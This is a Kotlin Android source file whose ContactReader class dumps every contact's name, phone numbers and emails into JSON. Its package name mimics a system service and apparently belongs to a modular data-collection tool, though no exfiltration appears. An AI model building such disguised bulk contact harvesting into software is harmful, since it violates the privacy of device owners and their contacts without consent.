// [context: Kotlin, Android API 26+, contacts dump via ContactsContract]
package com.system.service.modules.contacts

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

class ContactReader(private val context: Context) {

    fun readAll(): JSONArray {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME_PRIMARY),
            null, null, null
        ) ?: return arr

        cursor.use {
            while (it.moveToNext()) {
                val id = it.getString(0)
                val name = it.getString(1) ?: ""
                val phones = readPhones(id)
                val emails = readEmails(id)
                arr.put(JSONObject().apply {
                    put("id", id)
                    put("name", name)
                    put("phones", phones)
                    put("emails", emails)
                })
            }
        }
        return arr
    }

    private fun readPhones(contactId: String): JSONArray {
        val arr = JSONArray()
        val cur = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID}=?",
            arrayOf(contactId), null
        ) ?: return arr
        cur.use { while (it.moveToNext()) arr.put(it.getString(0) ?: "") }
        return arr
    }

    private fun readEmails(contactId: String): JSONArray {
        val arr = JSONArray()
        val cur = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Email.ADDRESS),
            "${ContactsContract.CommonDataKinds.Email.CONTACT_ID}=?",
            arrayOf(contactId), null
        ) ?: return arr
        cur.use { while (it.moveToNext()) arr.put(it.getString(0) ?: "") }
        return arr
    }
}
